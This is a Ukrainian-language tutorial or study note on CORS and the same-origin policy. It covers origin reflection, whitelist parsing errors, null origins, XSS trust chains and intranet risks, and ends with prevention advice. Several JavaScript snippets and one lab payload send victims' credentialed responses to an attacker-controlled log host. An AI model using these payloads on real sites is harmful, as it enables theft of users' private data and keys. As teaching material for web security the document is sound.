
## What is CORS (cross-origin resource sharing)?

Спільне використання ресурсів між різними джерелами (Cross-Origin Resource Sharing, CORS) - це механізм браузера, який дозволяє контрольований доступ до ресурсів, розташованих поза межами певного домену. Він розширює та додає гнучкості політиці одного джерела (Same-Origin Policy, SOP). Однак він також створює потенціал для міждоменних атак, якщо політика CORS вебсайту неправильно налаштована або реалізована. CORS **не є захистом** від міждоменних атак, таких як підробка міжсайтових запитів (CSRF).

# Same-origin policy (SOP)

Політика одного походження (same-origin policy) — це обмежувальна міждоменна специфікація, яка обмежує можливість вебсайту взаємодіяти з ресурсами за межами вихідного домену. Політика одного походження була визначена багато років тому як відповідь на потенційно зловмисні міждоменні взаємодії, наприклад, коли один сайт викрадає приватні дані з іншого.

Загалом вона дозволяє домену надсилати запити до інших доменів, але **не дозволяє отримувати доступ до відповідей**.

## What is the same-origin policy?

Політика одного походження (same-origin policy) — це механізм безпеки веббраузера, метою якого є запобігання атакам сайтів один на одного.

Політика одного походження обмежує скрипти з одного походження у доступі до даних з іншого походження. Походження (origin) складається зі схеми URI, домену та номера порту. Наприклад, розглянемо таку URL-адресу:
```
http://normal-website.com/example/example.html
```
Вона використовує схему **http**, домен **normal-website.com** і порт **80**. У таблиці нижче показано, як політика одного походження застосовується, якщо контент за наведеною URL-адресою намагається отримати доступ до інших походжень:

| URL accessed                              | Access permitted?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Yes: same scheme, domain, and port |
| `http://normal-website.com/example2/`     | Yes: same scheme, domain, and port |
| `https://normal-website.com/example/`     | No: different scheme and port      |
| `http://en.normal-website.com/example/`   | No: different domain               |
| `http://www.normal-website.com/example/`  | No: different domain               |
| `http://normal-website.com:8080/example/` | No: different port***              |
*** **Internet Explorer дозволяє такий доступ**, оскільки IE не враховує номер порту під час застосування політики одного походження.

## Relaxation of the same-origin policy

Політика одного походження є дуже обмежувальною, і тому було розроблено різні підходи для обходу цих обмежень. Багато вебсайтів взаємодіють із піддоменами або сторонніми сайтами таким чином, що це потребує повного міждоменного доступу. Кероване послаблення політики одного походження можливе за допомогою механізму спільного доступу до ресурсів між доменами (CORS).

Протокол CORS використовує набір HTTP-заголовків, які визначають довірені вебпоходження та пов’язані властивості, наприклад, чи дозволений автентифікований доступ. Ці заголовки обмінюються між браузером і міждоменним вебсайтом, до якого браузер намагається отримати доступ.

## CORS and the Access-Control-Allow-Origin response header

Специфікація спільного доступу до ресурсів між доменами (CORS) забезпечує контрольоване послаблення політики одного походження для HTTP-запитів з одного домену вебсайту до іншого за допомогою набору HTTP-заголовків. Браузери дозволяють доступ до відповідей на міждоменні запити на основі інструкцій, заданих у цих заголовках.

## What is the Access-Control-Allow-Origin response header?

Заголовок **Access-Control-Allow-Origin** міститься у відповіді одного вебсайту на запит, що походить з іншого вебсайту, і визначає дозволене походження (origin) запиту. Веббраузер порівнює значення **Access-Control-Allow-Origin** з походженням сайту, який надіслав запит, і дозволяє доступ до відповіді, якщо вони збігаються.

## Implementing simple cross-origin resource sharing

Специфікація **cross-origin resource sharing (CORS)** описує, які HTTP-заголовки обмінюються між вебсерверами та браузерами, щоб обмежити, з яких джерел (origin) дозволені запити до вебресурсів за межами початкового домену. Специфікація CORS визначає набір протокольних заголовків, серед яких найважливішим є **Access-Control-Allow-Origin**. Цей заголовок повертається сервером, коли вебсайт запитує ресурс з іншого домену, а браузер додає до запиту заголовок **Origin**.

Наприклад, припустимо, що вебсайт з походженням **normal-website.com** ініціює такий міждоменний запит:
```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```
Сервер на **robust-website.com** повертає таку відповідь:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```
Браузер дозволить коду, що виконується на **normal-website.com**, отримати доступ до відповіді, оскільки походження збігаються.

Специфікація **Access-Control-Allow-Origin** дозволяє вказувати кілька джерел, значення **null** або символ підстановки `*`. Однак жоден браузер не підтримує кілька джерел одночасно, і існують обмеження на використання символу `*`.

## Handling cross-origin resource requests with credentials

За замовчуванням, запити до ресурсів з іншого походження (cross-origin) відправляються **без облікових даних**, таких як cookies або заголовок Authorization.

Однак сервер, на який робиться запит, може дозволити читання відповіді **разом з обліковими даними**, встановивши заголовок CORS **`Access-Control-Allow-Credentials: true`**.

Якщо вебсайт, який робить запит, за допомогою JavaScript вказує, що відправляє cookies разом із запитом, наприклад:
```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<значення>
```
І сервер відповідає так:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```
Тоді браузер дозволить вебсайту читати відповідь, тому що встановлений заголовок **`Access-Control-Allow-Credentials: true`**.

Якщо ж цього заголовка немає, браузер **не дозволить доступ** до відповіді.
## Relaxation of CORS specifications with wildcards

Заголовок **Access-Control-Allow-Origin** підтримує **wildcard** (символ `*`). Наприклад:
```
Access-Control-Allow-Origin: *
```
`*` — це wildcard, що означає **“дозволити доступ усім доменам”**, тобто будь-який сайт з будь-яким Origin зможе отримати доступ до ресурсів.

Зверніть увагу, що wildcard не можна використовувати всередині будь‑якого іншого значення. Наприклад, такий заголовок є **некоректним**:
```
Access-Control-Allow-Origin: https://*.normal-website.com
```
На щастя, з точки зору безпеки, використання wildcard обмежене в специфікації, оскільки **не можна поєднувати wildcard з міждоменним передаванням облікових даних** (аутентифікації, cookies або клієнтських сертифікатів). Відповідно, міждоменна відповідь сервера такого вигляду:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
**не допускається**, оскільки це було б вкрай небезпечно, відкриваючи будь‑який автентифікований вміст цільового сайту для всіх.

З огляду на ці обмеження, деякі вебсервери **динамічно створюють заголовки Access-Control-Allow-Origin на основі Origin, вказаного клієнтом**. Це є обхідним шляхом обмежень CORS, який **не є безпечним**. 
## Pre-flight checks

Перевірка **pre-flight** була додана в специфікацію **CORS**, щоб захистити старі ресурси від розширених типів запитів, дозволених CORS.

За певних умов, коли міждоменний запит використовує **нестандартний HTTP-метод** або **кастомні заголовки**, браузер спочатку надсилає запит **OPTIONS** (це і є pre-flight), щоб перевірити, які методи та заголовки дозволені сервером перед виконанням основного запиту.

Сервер у відповіді повертає:

- список дозволених методів
    
- довірений домен
    
Браузер перевіряє, чи дозволений метод запитуваного сайту.

**Приклад pre-flight запиту** (браузер хоче використати метод PUT і кастомний заголовок Special-Request-Header):

```
OPTIONS /data HTTP/1.1
Host: <some website>
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
Відповідь сервера:
```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
Що це означає:

- сервер вказав, що дозволені методи **PUT, POST, OPTIONS**
    
- дозволений заголовок **Special-Request-Header**
    
- дозволено відправляти облікові дані (cookies, токени)
    
- **Access-Control-Max-Age** = 240 секунд - браузер може кешувати цю перевірку
    

Якщо методи та заголовки дозволені (як у цьому прикладі), браузер виконує основний запит звичайним способом.

 Недолік pre-flight перевірок: вони додають **додатковий HTTP-запит**, тому збільшують час завантаження сторінки.

## Vulnerabilities arising from CORS configuration issues

Багато сучасних вебсайтів використовують **CORS**, щоб дозволити доступ із піддоменів або довірених сторонніх сайтів. Але їхня реалізація CORS може містити помилки або бути занадто «м’якою», щоб усе працювало без проблем. У результаті це може призвести до **вразливостей, які можна використати для атаки**.

### Server-generated ACAO header from client-specified Origin header

Деяким застосункам потрібно надавати доступ одразу багатьом іншим доменам. Підтримувати список дозволених доменів — це постійна робота, і будь‑яка помилка може зламати функціональність. Тому деякі застосунки обирають «легкий шлях» і фактично дозволяють доступ **з будь‑якого домену**.

Один зі способів зробити це — читати заголовок **Origin** із запиту та повертати у відповіді заголовок, який дозволяє саме цей домен. Наприклад, застосунок отримує такий запит:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

І відповідає так:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```
Ці заголовки означають:

- доступ дозволено для домену, який надіслав запит (**malicious-website.com**);
    
- міждоменні запити можуть містити cookies (**Access-Control-Allow-Credentials: true**), тобто виконуються від імені залогіненого користувача.
    
Оскільки застосунок **віддзеркалює будь‑який Origin** у заголовку `Access-Control-Allow-Origin`, це означає, що **будь‑який домен** може отримати доступ до ресурсів уразливого сайту.

Якщо відповідь містить чутливі дані (наприклад, API‑ключ або CSRF‑токен), зловмисник може викрасти їх, розмістивши на своєму сайті такий JavaScript‑код:

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
**Суть проблеми:** сервер довіряє будь‑якому Origin і дозволяє доступ із cookies - це серйозна помилка в CORS, яка дозволяє викрадати приватні дані користувачів.

### Errors parsing Origin headers

Деякі додатки, які підтримують доступ з кількох джерел (origins), роблять це за допомогою білого списку дозволених джерел. Коли надходить CORS-запит, вказане джерело порівнюється з білим списком. Якщо джерело є у білому списку, воно відображається в заголовку **Access-Control-Allow-Origin**, щоб надати доступ.

Наприклад, додаток отримує звичайний запит, такий як:
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
Додаток перевіряє вказане джерело за списком дозволених, і, якщо воно є у списку, відображає його таким чином:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```
Помилки часто виникають при реалізації білого списку джерел у CORS. Деякі організації вирішують дозволити доступ з усіх своїх піддоменів (включно з майбутніми піддоменами, яких ще не існує). Деякі додатки дозволяють доступ з різних доменів інших організацій, включно з їх піддоменами. Такі правила часто реалізуються шляхом порівняння префіксів або суфіксів URL, або за допомогою регулярних виразів. Будь-які помилки в реалізації можуть призвести до надання доступу небажаним зовнішнім доменам.

Наприклад, припустимо, що додаток надає доступ усім доменам, що закінчуються на:
```
normal-website.com
```
Атакуючий може отримати доступ, зареєструвавши домен:
```
hackersnormal-website.com
```
Або припустимо, що додаток надає доступ усім доменам, що починаються з:
```
normal-website.com
```
Атакуючий може отримати доступ, використавши домен:
```
normal-website.com.evil-user.net
```
### Whitelisted null origin value

Специфікація заголовка **Origin** підтримує значення **null**. Браузери можуть надсилати значення **null** у заголовку **Origin** в різних незвичних ситуаціях:

- міждоменні перенаправлення (cross-origin redirects);
    
- запити із серіалізованих даних;
    
- запити з використанням протоколу **file:**;
    
- ізольовані (sandboxed) міждоменні запити.
    
Деякі додатки можуть додавати джерело **null** до білого списку, щоб підтримати локальну розробку додатка. Наприклад, припустимо, що додаток отримує такий міждоменний запит:
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
І сервер відповідає:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
У цій ситуації зловмисник може використовувати різні прийоми, щоб згенерувати міждоменний запит, який містить значення **null** у заголовку **Origin**. Це задовольнить умови білого списку, що призведе до міждоменного доступу. Наприклад, це можна зробити за допомогою ізольованого міждоменного запиту через **iframe** такого вигляду:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>

або 

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
### Exploiting XSS via CORS trust relationships

Навіть «правильно» налаштований CORS встановлює довірчі відносини між двома джерелами (origins). Якщо вебсайт довіряє джерелу, яке має вразливість **cross-site scripting (XSS)**, тоді зловмисник може скористатися цією XSS‑вразливістю, щоб впровадити JavaScript‑код, який за допомогою CORS отримає конфіденційну інформацію з сайту, що довіряє вразливому додатку.

Розглянемо такий запит:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
Якщо сервер відповідає так:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Тоді зловмисник, який знайде XSS‑вразливість на **subdomain.vulnerable-website.com**, зможе використати її для отримання API‑ключа, застосувавши URL на кшталт:
```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```
### Breaking TLS with poorly configured CORS

Припустимо, що додаток, який суворо використовує HTTPS, також додає до білого списку довірений піддомен, що працює через звичайний HTTP. Наприклад, коли додаток отримує такий запит:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
Додаток відповідає:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
У цій ситуації зловмисник, який має можливість перехоплювати трафік користувача‑жертви, може скористатися конфігурацією CORS, щоб скомпрометувати взаємодію жертви з додатком. Атака складається з таких кроків:

1. Користувач‑жертва робить будь‑який HTTP‑запит без шифрування.
    
2. Зловмисник підміняє відповідь і вставляє перенаправлення на:
    
    `http://trusted-subdomain.vulnerable-website.com`
    
3. Браузер жертви переходить за цим перенаправленням.
    
4. Зловмисник перехоплює HTTP‑запит і повертає підроблену відповідь, що містить CORS‑запит до:
    
    `https://vulnerable-website.com`
    
5. Браузер жертви виконує CORS‑запит, включаючи заголовок:
    
    `Origin: http://trusted-subdomain.vulnerable-website.com`
    
6. Додаток дозволяє цей запит, оскільки джерело є у білому списку. Запитувані конфіденційні дані повертаються у відповіді.
    
7. Підроблена сторінка зловмисника може прочитати конфіденційні дані та передати їх на будь‑який домен, що контролюється зловмисником.
    
Ця атака є ефективною навіть у тому випадку, якщо вразливий вебсайт загалом надійно використовує HTTPS, не має HTTP‑ендпойнтів і всі cookies позначені як **secure**.

Приклад коду 
```
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```
Цей скрипт реалізує багатоступеневу атаку, що поєднує **XSS** та вразливість у налаштуваннях **CORS**. Спочатку він перенаправляє жертву з вашого експлойт-сервера на вразливий піддомен `stock` через незахищений протокол **HTTP**. Використання саме HTTP є ключовим моментом: основний домен помилково вважає цей піддомен «довіреним» навіть без шифрування, що дозволяє обійти стандартні обмеження безпеки браузера.

Після завантаження сторінки на піддомені в браузері жертви спрацьовує прихований у параметрі `productId` JavaScript-код. Цей код ініціює запит (`XMLHttpRequest`) до головного сайту на сторінку `/accountDetails`, де зберігається конфіденційна інформація. Завдяки параметру `withCredentials = true`, браузер автоматично додає до запиту **сесійні куки** жертви, змушуючи сервер віддати персональні дані користувача так, ніби він сам відкрив цю сторінку.

На фінальному етапі функція `reqListener` зчитує отриману відповідь (наприклад, HTML-код профілю з API-ключем) і миттєво відправляє її на ваш **Exploit Server**. Дані додаються прямо в URL-адресу як параметр `key`. У результаті ви отримуєте повний текст конфіденційної сторінки у своїх логах, що дозволяє викрасти чутливі дані користувача, фактично не знаючи його логіна чи пароля.
### Intranets and CORS without credentials

Більшість атак на CORS залежать від наявності заголовка відповіді:
```
Access-Control-Allow-Credentials: true
```
Без цього заголовка браузер користувача‑жертви відмовиться надсилати cookies, а це означає, що зловмисник отримає доступ лише до неавторизованого контенту, який він так само легко міг би отримати, просто зайшовши на цільовий сайт напряму.

Однак існує одна поширена ситуація, коли зловмисник **не може отримати прямий доступ до сайту**: коли цей сайт є частиною внутрішньої мережі організації (інтранету) і розташований у приватному IP‑просторі. Внутрішні сайти часто мають нижчий рівень безпеки, ніж публічні, що дозволяє зловмисникам знаходити вразливості та отримувати подальший доступ.

Наприклад, міждоменний запит у межах приватної мережі може виглядати так:
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
А сервер відповідає:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
Сервер додатка довіряє запитам до ресурсів з **будь‑якого джерела**, але без використання облікових даних. Якщо користувачі з приватного IP‑простору мають доступ до публічного інтернету, тоді можна виконати CORS‑атаку з зовнішнього сайту, використовуючи браузер жертви як проксі для доступу до ресурсів інтранету.

## How to prevent CORS-based attacks

Вразливості CORS виникають переважно через **неправильну конфігурацію**. Тому **запобігання проблемам з CORS — це питання правильної налаштування**. Наступні розділи описують ефективні способи захисту від атак на CORS.
### Правильне налаштування міждоменних запитів

Якщо веб‑ресурс містить **чутливу інформацію**, у заголовку `Access-Control-Allow-Origin` повинно бути **чітко вказане джерело (origin)**, якому довіряють.
### Дозволяти лише довірені сайти

Може здатися очевидним, але **в Access-Control-Allow-Origin слід вказувати лише ті сайти, яким довіряють**.  
Особливо небезпечним є **динамічне відображення origin із запиту без перевірки** — це легко експлуатується і має бути уникається.
### Не додавати `null` у whitelist

Не використовуйте:

`Access-Control-Allow-Origin: null`

- Внутрішні документи та sandboxed запити можуть встановлювати origin як `null`.
    
- Заголовки CORS повинні бути **чітко визначені для довірених джерел** як для приватних, так і для публічних серверів.
    
### Уникати wildcard у внутрішніх мережах

- Не використовуйте `*` (wildcard) для internal‑ресурсів.
    
- **Не можна покладатися лише на конфігурацію мережі** для захисту внутрішніх ресурсів, особливо коли браузери внутрішньої мережі можуть отримати доступ до недовірених зовнішніх доменів.
    
### CORS не замінює серверні політики безпеки

- CORS визначає **поведінку браузера**, але **не замінює серверний захист чутливих даних**.
    
- Зловмисник може **безпосередньо підробити запит з будь-якого довіреного origin**.
    
- Тому сервери повинні продовжувати застосовувати захист чутливих даних:
    
    - аутентифікацію
        
    - управління сесіями
        
    - інші серверні політики  
        Поряд із **правильно налаштованим CORS**.
